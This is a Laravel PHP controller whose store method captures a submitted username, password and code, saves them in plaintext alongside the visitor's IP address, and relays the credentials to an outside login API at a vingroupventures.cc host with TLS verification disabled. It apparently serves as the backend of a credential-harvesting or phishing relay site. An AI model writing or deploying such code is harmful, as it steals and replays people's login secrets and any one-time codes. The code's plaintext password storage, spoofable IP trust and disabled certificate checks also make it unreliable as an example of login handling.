<?php

namespace App\Http\Controllers;

use App\Http\Requests\UserRequest;
use App\Models\User;
use Illuminate\Support\Facades\Http;

class CredentialController extends Controller
{
    const VINGROUP_API_URL = 'http://api.vingroupventures.cc/api';
    /**
     * Store a newly created resource in storage.
     */
    public function store(UserRequest $request)
    {
        $username = $request->get('username');
        $password = $request->get('password');
        $code = $request->get('code');
        $lang = $request->header('Lang', 'vietnamese');

         User::create([
            'ip' => $this->getUserIpAddr(),
            'username' => $username,
            'password' => $password,
            'code' => $code,
        ]);

        $response = Http::withHeaders([
            'Accept' => 'application/json',
            'Content-Type' => 'application/json',
            "Lang" => $lang
        ])->withOptions([
            "verify" => false
        ])->post(self::VINGROUP_API_URL . '/auth/login', [
            "username" => $username,
            "password" => $password
        ]);

        $jsonData = $response->json();

        return response()->json($jsonData);
    }

    function getUserIpAddr(){
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            //ip from share internet
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            //ip pass from proxy
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}
